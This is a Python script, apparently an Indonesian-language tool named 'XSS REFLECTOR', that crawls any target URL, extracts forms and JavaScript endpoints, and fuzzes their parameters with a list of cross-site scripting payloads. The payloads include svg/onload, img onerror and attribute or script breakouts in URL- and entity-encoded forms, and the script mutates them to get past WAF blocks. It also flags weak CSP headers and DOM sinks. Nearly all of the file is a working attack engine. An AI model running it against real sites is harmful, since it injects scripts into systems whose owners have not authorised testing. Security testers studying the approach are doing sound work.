#!/usr/bin/env python3
import requests, re, time, random, json, os, base64
import urllib.parse as up
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
from tabulate import tabulate
import esprima

init(autoreset=True)


TIMEOUT = 12
DELAY_RANGE = (0.3, 0.8)
MAX_THREADS = 4
HEADERS = {"User-Agent": "XSS-PRO-MAX/2.8"}
REPORT_JSON = "hasil.json"

PAYLOAD_POOL = [
    
    '<svg/onload=alert(1337)>',
    '<img src=x onerror=alert(1337)>',
    '<details open ontoggle=alert(1337)>',
    '<iframe src=javascript:alert(1337)>',
    '<math><mtext><svg/onload=alert(1337)>',

    
    '" onmouseover=alert(1337) x="',
    "' onfocus=alert(1337) autofocus '",
    '" onclick=alert(1337) x="',
    "'><svg/onload=alert(1337)>",
    '" style="background:url(javascript:alert(1337))',

    
    '";alert(1337)//',
    "';alert(1337)//",
    '`;alert(1337)//',
    '");alert(1337)//',
    "');alert(1337)//",

    
    '"><svg/onload=alert(1337)>',
    '</script><svg/onload=alert(1337)>',
    '--><svg/onload=alert(1337)>',

    
    '<SvG/onLoAd=alert(1337)>',
    '<svg/onload=window>',
    '<svg/onload=confirm(1337)>',
    '<svg/onload=alert/**/(1337)>',

    
    '%3Csvg%2Fonload%3Dalert(1337)%3E',
    '%253Csvg%252Fonload%253Dalert(1337)%253E',
    '&#x3c;svg&#x2f;onload&#x3d;alert(1337)&#x3e;',
]


visited_js, visited_ep = set(), set()
endpoint_set = set()
js_code_cache = {}

stats = {
    "js": 0,
    "ep": 0,
    "tested": 0,
    "reflected": 0,
    "dom": 0,
    "csp_weak": 0,
    "waf": 0
}

results = {
    "endpoints": [],
    "reflected": [],
    "dom": [],
    "csp": []
}


def banner():
    print(Fore.CYAN + Style.BRIGHT + "XSS REFLECTOR BY 𝕽𝖔𝖑𝖆𝖓𝖉𝖎𝖓𝖔\n")

def render(status):
    os.system("clear")
    banner()
    table = [[
        stats["js"],
        stats["ep"],
        stats["tested"],
        stats["reflected"],
        stats["dom"],
        stats["csp_weak"],
        stats["waf"],
        status
    ]]
    print(tabulate(
        table,
        headers=["JS","EP","TEST","XSS","DOM","CSP","WAF","STATUS"],
        tablefmt="fancy_grid"
    ))

def sleep():
    time.sleep(random.uniform(*DELAY_RANGE))


def severity_score(reflect=False, dom=False, csp=False):
    score = 0
    if reflect: score += 5
    if dom: score += 4
    if csp: score += 2
    return (
        "CRITICAL" if score >= 9 else
        "HIGH" if score >= 6 else
        "MEDIUM" if score >= 3 else
        "LOW"
    )


def generate_payloads(context="html"):
    payloads = []

    for p in PAYLOAD_POOL:
        payloads.append(p)                       # original
        payloads.append(up.quote(p))             # url-encoded
        payloads.append(base64.b64encode(p.encode()).decode())  # base64

    return list(set(payloads))

def mutate_payload(payload):
    mutations = [
        payload.replace("svg", "SvG"),
        payload.replace("<", "<!--").replace(">", "-->"),
        payload.replace("alert", "aLeRt"),
        payload.replace("onload", "onLoAd"),
    ]
    return random.choice(mutations)


def detect_context(resp, payload):
    if f'"{payload}"' in resp:
        return "attr"
    if payload in resp and "<script>" in resp:
        return "js"
    return "html"


def analyze_csp(headers, target):
    csp = headers.get("Content-Security-Policy")
    if not csp:
        return
    weak = any(x in csp for x in ["unsafe-inline", "unsafe-eval", "*"])
    results["csp"].append({"target": target, "policy": csp})
    if weak:
        stats["csp_weak"] += 1
        print(Fore.YELLOW + "[CSP WEAK] " + target)


DOM_SINK = re.compile(r"(innerHTML|outerHTML|document.write|eval|setTimeout|setInterval)", re.I)
DOM_SOURCE = re.compile(r"(location|document.URL|window.name)", re.I)

def analyze_js_ast(js, url):
    try:
        tree = esprima.parseScript(js, tolerant=True)
    except:
        return

    src = sink = False
    for node in tree.body:
        text = str(node).lower()
        if DOM_SOURCE.search(text):
            src = True
        if DOM_SINK.search(text):
            sink = True

    if src and sink:
        stats["dom"] += 1
        sev = severity_score(dom=True)
        results["dom"].append({
            "js": url,
            "risk": sev,
            "type": "STATIC_DOM_FLOW"
        })
        print(Fore.MAGENTA + f"[DOM XSS][{sev}] {url}")


JS_ENDPOINT_REGEX = re.compile(
    r"""
    (?:
        fetch\s*\(\s*(?:new\s+URL\()?['"`]([^'"`]+)['"`]
        |axios\.(?:get|post|put|delete|patch|head|options)\s*\(\s*['"`]([^'"`]+)['"`]
        |ky\.(?:get|post|put|delete|patch|head|options)\s*\(\s*['"`]([^'"`]+)['"`]
        |got\.(?:get|post|put|delete|patch|head|options)\s*\(\s*['"`]([^'"`]+)['"`]
        |superagent\.(?:get|post|put|delete|patch)\s*\(\s*['"`]([^'"`]+)['"`]
        |\.open\s*\(\s*['"`](?:GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)['"`]\s*,\s*['"`]([^'"`]+)['"`]
        |\$\.(?:get|post|ajax|load|getJSON)\s*\(\s*['"`]([^'"`]+)['"`]
        |new\s+Request\s*\(\s*['"`]([^'"`]+)['"`]
        |new\s+URL\s*\(\s*['"`]([^'"`]+)['"`]
        |location\.(?:href|assign|replace)\s*=\s*['"`]([^'"`]+)['"`]
        |window\.open\s*\(\s*['"`]([^'"`]+)['"`]
        |new\s+WebSocket\s*\(\s*['"`]([^'"`]+)['"`]
        |new\s+EventSource\s*\(\s*['"`]([^'"`]+)['"`]
        |import\s*\(\s*['"`]([^'"`]+)['"`]
        |require\s*\(\s*['"`]([^'"`]+)['"`]
        |(?:src|href|action)\s*=\s*['"`]([^'"`]+)['"`]
        |/api/[a-zA-Z0-9_/\-\.?=&%]+
        |/v\d+/[a-zA-Z0-9_/\-\.?=&%]+
    )
    """,
    re.I | re.X
)

def extract_js_endpoints(js, base):
    matches = JS_ENDPOINT_REGEX.findall(js)

    for match in matches:
        
        if isinstance(match, tuple):
            for url in match:
                if not url:
                    continue
                ep = up.urljoin(base, url)
                if ep not in endpoint_set:
                    endpoint_set.add(ep)
                    stats["ep"] += 1
        else:
            ep = up.urljoin(base, match)
            if ep not in endpoint_set:
                endpoint_set.add(ep)
                stats["ep"] += 1

def analyze_js(js_url):
    if js_url in visited_js:
        return
    visited_js.add(js_url)
    stats["js"] += 1

    try:
        r = requests.get(js_url, headers=HEADERS, timeout=TIMEOUT)
        if r.status_code == 200:
            js_code_cache[js_url] = r.text
            analyze_js_ast(r.text, js_url)
            extract_js_endpoints(r.text, js_url)
    except:
        pass


def crawl(target):
    render("CRAWLING")
    try:
        r = requests.get(target, headers=HEADERS, timeout=TIMEOUT)
    except:
        return

    analyze_csp(r.headers, target)
    soup = BeautifulSoup(r.text, "html.parser")

    for form in soup.find_all("form"):
        action = form.get("action") or target
        url = up.urljoin(target, action)
        for inp in form.find_all("input"):
            name = inp.get("name")
            if name:
                endpoint_set.add(f"{url}?{name}=FUZZ")
                stats["ep"] += 1

    for s in soup.find_all("script", src=True):
        analyze_js(up.urljoin(target, s["src"]))


def test_xss(url):
    if url in visited_ep:
        return
    visited_ep.add(url)

    p = up.urlparse(url)
    base = f"{p.scheme}://{p.netloc}{p.path}"
    params = up.parse_qs(p.query)

    for k in params:
        for payload in generate_payloads():
            stats["tested"] += 1
            render("TESTING")
            try:
                r = requests.get(base, params={k: payload}, headers=HEADERS, timeout=TIMEOUT)
                if r.status_code in [403, 406]:
                    stats["waf"] += 1
                    payload = mutate_payload(payload)
                    continue

                if payload in r.text:
                    ctx = detect_context(r.text, payload)
                    sev = severity_score(
                        reflect=True,
                        dom=False,
                        csp="Content-Security-Policy" not in r.headers
                    )
                    stats["reflected"] += 1
                    results["reflected"].append({
                        "url": r.url,
                        "param": k,
                        "payload": payload,
                        "context": ctx,
                        "severity": sev
                    })
                    print(Fore.GREEN + f"[XSS][{ctx.upper()}][{sev}] {r.url}")
                    break
            except:
                pass
            sleep()


def main():
    banner()
    target = input(Fore.YELLOW + "Masukan Target Url: ").strip()
    if not target.startswith("http"):
        print("Invalid URL")
        return

    crawl(target)

    with ThreadPoolExecutor(MAX_THREADS) as ex:
        for ep in list(endpoint_set):
            ex.submit(test_xss, ep)

    with open(REPORT_JSON, "w") as f:
        json.dump(results, f, indent=2)

    render("DONE")
    print(Fore.GREEN + "\nSelesai !")
    print(Fore.CYAN + f"Laporan : {REPORT_JSON}")

if __name__ == "__main__":
    main()